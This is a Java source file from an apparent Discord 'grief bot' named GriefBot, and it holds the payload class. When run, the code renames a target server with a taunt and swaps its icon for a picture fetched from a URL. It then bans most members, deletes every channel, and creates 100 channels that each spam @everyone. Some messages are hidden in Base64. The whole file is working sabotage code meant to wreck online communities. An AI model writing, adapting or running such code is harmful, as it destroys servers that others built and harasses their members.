package de.corruptedbytes;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import javax.imageio.ImageIO;

import de.corruptedbytes.logger.GriefBotLogger;
import de.corruptedbytes.logger.GriefBotLoggerLevel;
import de.corruptedbytes.utils.Shelv;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;

public class GriefBotPayload implements Runnable {

	private Guild guild;
	private User user;

	public GriefBotPayload(Guild guild, User user) {
		this.guild = guild;
		this.user = user;
	}
	
	@Override
	public void run() {
		String name = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
		guild.getManager().setName(name).queue();
		
		try {
			guild.getManager()
					.setIcon(Icon.from(getImageBlob(ImageIO.read(new URL(GriefBot.getInstance().getGriefPicture())))))
					.queue();
		} catch (IOException e) {
			GriefBotLogger.log(e.getMessage(), GriefBotLoggerLevel.ERROR);
		}

		for (Member member : guild.getMembers()) {
			if (!(member.isOwner() || member.getUser().isBot()
					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) || isBotRoleHigher(member)) {
				member.getGuild().ban(member, 0, "bruh").queue();
			} else {
				continue;
			}
		}

		guild.getChannels().forEach(key -> {
			key.delete().queue();
		});

		TextChannel base = guild
				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
				.complete();
		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();

		for (int i = 0; i < 100; i++) {
			try {
				TextChannel grief = guild.createTextChannel(name.toLowerCase()).complete();
				grief.sendMessage("@everyone\r\n" + GriefBot.getInstance().getSpamMessage()).queue();
			} catch (Exception ignored) {
			}
		}
		guild.getManager().reason(name).queue();
	}
	
	private boolean isBotRoleHigher(Member member) {
		for (Role memberRole : member.getRoles()) {
			for (Role botRole : this.guild.getMemberById(this.guild.getJDA().getSelfUser().getIdLong()).getRoles()) {
				if (botRole.getPosition() > memberRole.getPosition())
					return true;
			}
		}
		return false;
	}

	private InputStream getImageBlob(BufferedImage bufferedImage) throws IOException {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ImageIO.write(bufferedImage, "png", baos);
		InputStream is = new ByteArrayInputStream(baos.toByteArray());

		return is;
	}
}
